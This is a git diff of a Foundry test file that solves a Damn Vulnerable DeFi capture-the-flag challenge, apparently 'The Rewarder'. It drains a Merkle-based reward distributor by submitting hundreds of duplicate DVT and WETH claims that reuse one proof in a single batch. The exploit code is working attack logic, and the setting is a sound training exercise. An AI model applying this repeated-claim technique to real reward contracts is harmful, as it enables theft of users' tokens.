@@ -22,6 +22,10 @@ contract TheRewarderChallenge is Test {
     uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
     uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;
 
+    // Player is the address at index 188 in the distribution files
+    uint256 constant PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+    uint256 constant PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
     TheRewarderDistributor distributor;
 
     // Instance of Murky's contract to handle Merkle roots, proofs, etc.
@@ -144,11 +148,67 @@ contract TheRewarderChallenge is Test {
         assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
     }
 
+    /*
+    struct Distribution {
+        uint256 remaining;
+        uint256 nextBatchNumber;
+        mapping(uint256 batchNumber => bytes32 root) roots;
+        mapping(address claimer => mapping(uint256 word => uint256 bits)) claims;
+    }
+
+    struct Claim {
+        uint256 batchNumber;
+        uint256 amount;
+        uint256 tokenIndex;
+        bytes32[] proof;
+    }
+
+    */
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // player 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        // player index
+        uint256 index = 188;
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](867);
+
+        for (uint256 i; i < 867; i++) {
+            // First, the DVT claim
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, index)
+            });
+        }
+
+        Claim[] memory claims1 = new Claim[](853);
+
+        for (uint256 i; i < 853; i++) {
+            // Second, the WETH claim
+            claims1[i] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, index)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claims1, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
